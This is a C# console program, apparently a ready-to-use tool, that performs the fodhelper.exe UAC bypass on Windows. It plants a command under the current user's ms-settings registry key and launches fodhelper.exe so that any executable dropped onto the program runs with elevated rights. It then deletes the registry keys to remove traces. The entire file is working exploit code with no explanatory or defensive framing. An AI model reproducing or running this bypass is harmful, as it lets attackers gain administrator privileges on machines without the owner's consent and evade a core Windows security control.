using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Khaelita_UAC
{
    internal class Program
    {
        static void Main(string[] args)
        {
#if WIN64
            Console.WriteLine("[DEBUG] This is a 64-bit build.");
#else
            Console.WriteLine("[DEBUG] This is a 32-bit build.");
#endif

            if (args.Length != 1 || !File.Exists(args[0]))
            {
                Console.WriteLine("Please drag and drop a valid .exe file onto this program.");
                goto WaitExit;
            }

            string payload = $"cmd.exe /c \"\"{args[0]}\"\"";

            try
            {
                Console.WriteLine("[*] Writing registry keys...");

                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\Shell\Open\command"))
                {
                    if (key == null)
                    {
                        Console.WriteLine("[-] Failed to create registry key.");
                        goto WaitExit;
                    }

                    key.SetValue(null, payload, RegistryValueKind.String);
                    key.SetValue("DelegateExecute", "", RegistryValueKind.String);
                }

                Console.WriteLine("[*] Registry trap created. Launching fodhelper.exe...");

                Process.Start(new ProcessStartInfo
                {
                    FileName = @"C:\Windows\System32\fodhelper.exe",
                    UseShellExecute = true
                });

                Console.WriteLine("[*] Waiting a few seconds for payload...");
                System.Threading.Thread.Sleep(3000);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Exception: {ex.Message}");
            }

        Cleanup:
            Console.WriteLine("[*] Cleaning registry...");

            try
            {
                Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings\Shell\Open\command", false);
                Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings\Shell\Open", false);
                Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings\Shell", false);
                Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false);
            }
            catch { }

        WaitExit:
            Console.WriteLine("\n[+] Done. Press Enter to exit...");
            Console.ReadLine();
        }
    }
}
